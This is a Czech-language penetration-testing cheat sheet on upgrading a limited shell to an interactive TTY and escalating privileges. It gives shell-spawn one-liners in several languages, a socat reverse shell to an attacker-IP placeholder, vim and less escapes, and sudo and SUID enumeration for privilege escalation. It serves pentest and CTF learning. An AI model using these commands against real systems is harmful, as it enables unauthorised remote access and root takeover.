# 🐚 Interactive Shell Cheat Sheet

---

# 🐚 Spawning Interactive Shells (Moderní techniky)

Získání **omezeného ("hloupého") shellu** například přes webovou zranitelnost je pouze první krok.

Cílem je získat **TTY interaktivní shell**, který umožní:

- práci se šipkami a TAB doplňováním
- používání `sudo`
- práci s databázemi (`mysql`, `psql`)
- stabilní editaci souborů
- lepší kontrolu terminálu

---

# 1. Programovací jazyky (Rychlá cesta)

Moderní systémy mohou být minimalistické (například kontejnery), proto je dobré znát více možností.

---

## Python 3 (Nejčastější varianta)

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## Perl

Perl je často dostupný na starších i některých moderních Linux systémech.

```bash
perl -e 'exec "/bin/sh";'
```

---

## Ruby

Častý v některých cloudových aplikacích.

```bash
ruby -e 'exec "/bin/sh"'
```

---

## Node.js

Použitelné na serverech s Node.js runtime.

```bash
node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
```

---

# 2. Systémové utility (Living Off The Land)

Pokud nejsou dostupné programovací jazyky, lze využít běžné systémové nástroje.

---

# AWK

AWK je dostupný téměř na každém Unix/Linux systému.

```bash
awk 'BEGIN {system("/bin/sh")}'
```

---

# Find

Pokud lze spustit `find`, lze ho využít ke spuštění shellu.

```bash
find . -exec /bin/sh \; -quit
```

---

# Socat (Nejlepší varianta)

`Socat` umožňuje vytvořit stabilní shell s podporou:

- TTY
- signálů
- interaktivity
- správného terminálu

---

## Útočník

```bash
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

---

## Oběť

```bash
socat tcp-connect:<TVOJE_IP>:4444 exec:/bin/sh,pty,stderr,setsid,sigint,saned
```

---

# 3. Únik z editorů a aplikací (Escape Techniques)

Někdy získáš přístup pouze uvnitř určité aplikace.

Například:

- VIM
- Less
- More

---

# VIM Shell Escape

Spuštění přímo z příkazové řádky:

```bash
vim -c ':!/bin/sh'
```

---

Nebo uvnitř VIM:

Nastavení shellu:

```
:set shell=/bin/sh
```

Spuštění:

```
:shell
```

---

# Less / More Escape

Pokud čteš soubor pomocí `less`:

Napiš:

```
!/bin/sh
```

a potvrď Enter.

---

# 🔑 4. Prověření oprávnění a Privilege Escalation

Po získání interaktivního shellu je dalším cílem získat vyšší oprávnění.

Typický postup:

```
User Shell
     |
     ↓
Enumeration
     |
     ↓
Privilege Escalation
     |
     ↓
Root Access
```

---

# Sudo Permissions

Kontrola sudo práv:

```bash
sudo -l
```

---

Hledej například:

```
(ALL : ALL) NOPASSWD: ALL
```

Pokud existuje:

```bash
sudo su
```

---

# SUID Binárky

Soubory se SUID bitem mohou běžet s oprávněními vlastníka (často root).

Vyhledání:

```bash
find / -perm -u=s -type f 2>/dev/null
```

---

Nalezené binárky porovnej s databází:

```
GTFOBins
```

---

# 🛠️ Upgrade na plnohodnotný terminál

Pokud Netcat shell:

- nereaguje na šipky
- nefunguje mazání
- nemá správný terminál

proveď TTY upgrade.

---

# Step 1: Spawn Python TTY

Na oběti:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

# Step 2: Pozastavení shellu

Stiskni:

```
CTRL + Z
```

Shell se přesune na pozadí.

---

# Step 3: Nastavení terminálu

Na útočníkově stroji:

```bash
stty raw -echo
fg
```

Poté stiskni:

```
ENTER ENTER
```

---

# Step 4: Reset terminálu

```bash
reset
```

---

Nastavení typu terminálu:

```bash
export TERM=xterm-256color
```

---

# 📌 Interactive Shell Workflow

```
Initial Shell
      |
      ↓
Spawn TTY
      |
      ↓
Upgrade Terminal
      |
      ↓
Enumeration
      |
      ↓
Privilege Escalation
      |
      ↓
Root Shell
```

---

# 🧰 Nejčastější nástroje

| Nástroj | Účel |
|---|---|
| Python | Spawn TTY shell |
| Socat | Stabilní interaktivní shell |
| Netcat | Reverse/Bindshell komunikace |
| AWK | Living-off-the-land shell |
| Find | Escape a spuštění příkazů |
| GTFOBins | Abuse binárek pro eskalaci |
